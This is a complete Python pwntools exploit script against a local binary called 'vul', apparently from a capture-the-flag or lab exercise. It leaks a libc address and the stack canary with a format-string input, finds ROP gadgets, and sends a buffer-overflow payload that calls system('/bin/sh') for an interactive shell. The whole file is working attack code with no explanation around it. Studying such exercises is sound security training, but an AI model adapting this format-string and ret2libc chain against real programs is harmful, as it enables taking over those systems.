from platform import architecture
from pwn import *

context(os = "linux", arch = "amd64")
elf = context.binary = ELF("./vul")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")

vul = process(["./vul"])
vul.sendline(b"%3$p-%9$p")
print(vul.recvline())
addresses = vul.recv().strip().split(b'-')
libc_base = int (addresses[0], 16) - 0x11b214
canary = int(addresses[1], 16)  
log.success("Leaked addresses " + hex(libc_base) + " and " + hex(canary))

# getting gadgets using pwntools
pop_rdi_ret = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
ret = libc_base + rop.find_gadget(["ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
exit = libc_base + libc.symbols["exit"]

# attaching debugger
# pid = util.proc.pidof(vul)[0]
# print(f"pid  = {pid}")
# util.proc.wait_for_debugger(pid)

payload = flat(b'A' * 24, canary, b'A' * 8, ret, pop_rdi_ret, bin_sh, system, exit)
vul.sendline(payload)
vul.interactive()
vul.close()